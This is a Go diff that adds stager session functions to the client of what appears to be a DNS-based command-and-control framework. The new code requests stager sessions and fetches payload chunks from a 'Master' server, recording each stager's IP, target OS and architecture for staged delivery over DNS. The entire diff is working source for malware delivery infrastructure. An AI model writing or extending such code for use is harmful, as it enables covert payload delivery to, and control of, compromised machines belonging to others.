@@ -423,3 +423,71 @@ func (mc *MasterClient) IsConnected() bool {
 	// Consider connected if checked in within last 5 minutes
 	return time.Since(mc.lastCheckin) < 5*time.Minute
 }
+
+// Stager session support
+
+// StagerSessionInfo contains information about a stager deployment session
+type StagerSessionInfo struct {
+	SessionID   string   `json:"session_id"`
+	TotalChunks int      `json:"total_chunks"`
+	DNSDomains  []string `json:"dns_domains"`
+	ChunkSize   int      `json:"chunk_size"`
+}
+
+// StagerChunkResponse contains chunk data from Master
+type StagerChunkResponse struct {
+	ChunkIndex int    `json:"chunk_index"`
+	ChunkData  string `json:"chunk_data"`
+	Success    bool   `json:"success"`
+	Message    string `json:"message,omitempty"`
+}
+
+// InitStagerSession forwards a stager initialization request to Master
+func (mc *MasterClient) InitStagerSession(stagerIP, os, arch string) (*StagerSessionInfo, error) {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"stager_ip":     stagerIP,
+		"os":            os,
+		"arch":          arch,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/stager/init", req)
+	if err != nil {
+		return nil, fmt.Errorf("stager init failed: %w", err)
+	}
+
+	var sessionInfo StagerSessionInfo
+	if err := json.Unmarshal(respData, &sessionInfo); err != nil {
+		return nil, fmt.Errorf("failed to parse stager init response: %w", err)
+	}
+
+	return &sessionInfo, nil
+}
+
+// GetStagerChunk requests a specific chunk from Master for a stager session
+func (mc *MasterClient) GetStagerChunk(sessionID string, chunkIndex int, stagerIP string) (*StagerChunkResponse, error) {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"session_id":    sessionID,
+		"chunk_index":   chunkIndex,
+		"stager_ip":     stagerIP,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/stager/chunk", req)
+	if err != nil {
+		return nil, fmt.Errorf("stager chunk request failed: %w", err)
+	}
+
+	var chunkResp StagerChunkResponse
+	if err := json.Unmarshal(respData, &chunkResp); err != nil {
+		return nil, fmt.Errorf("failed to parse stager chunk response: %w", err)
+	}
+
+	if !chunkResp.Success {
+		return nil, fmt.Errorf("chunk not available: %s", chunkResp.Message)
+	}
+
+	return &chunkResp, nil
+}
